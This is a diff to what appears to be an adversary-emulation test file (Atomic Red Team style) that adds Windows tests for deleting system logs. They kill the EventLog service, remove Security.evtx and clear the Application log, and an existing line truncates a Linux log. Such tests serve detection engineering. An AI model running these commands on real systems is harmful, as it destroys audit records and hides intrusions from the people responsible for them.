@@ -71,3 +71,29 @@ atomic_tests:
     name: bash
     command: |
       echo 0> #{log_path}
+
+- name: Delete System Logs Using PowerShell
+  description: |
+    Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+      Stop-Process -Id $eventLogId -Force
+      Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+    cleanup_command: |
+      Start-Service -Name EventLog
+
+- name: Delete System Logs Using Clear-EventLogId
+  description: |
+    Clear event logs using built-in PowerShell commands
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Clear-EventLog -logname Application
